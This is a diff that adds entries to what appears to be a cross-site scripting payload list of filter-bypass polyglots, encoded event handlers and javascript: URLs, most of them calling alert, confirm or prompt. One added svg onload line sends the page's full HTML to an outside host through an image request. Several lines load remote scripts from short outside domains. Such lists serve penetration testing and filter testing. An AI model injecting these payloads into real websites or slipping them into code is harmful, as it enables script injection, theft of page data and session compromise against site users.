@@ -18,6 +18,8 @@
 {{'tester'.constructor.prototype.charAt=[].join;$eval('test=test} } };alert(document.domain)//');}}
 '-setTimeout`prompt\u0028document.domain\u0029`-'
 -setTimeout`prompt\u0028document.domain\u0029`-
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+<svg/onload="(new Image()).src='//infoseguranca.com.br/'%2Bdocument.documentElement.innerHTML">
 onload=alert(document.domain)
 javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 "'><img src=x onerror=alert(1)>
@@ -67,3 +69,25 @@ Test%20%3Cimg%20src%3Dx%20onerror%3Dalert%282%29%3E
 ayn%253C%2Fscript%253E%253Csvg%2Fonload%3Dalert%28document%252edomain%29%253E
 ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E
 ayn</script><svg/onload=alert(document.domain)>
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<script y="><">/*<script* */prompt()</script
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<svg/x=">"/onload=confirm()//
+<--`<img/src=` onerror=confirm``> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<!--><script src=//14.rs>
+<embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<svg onload=write()>
+
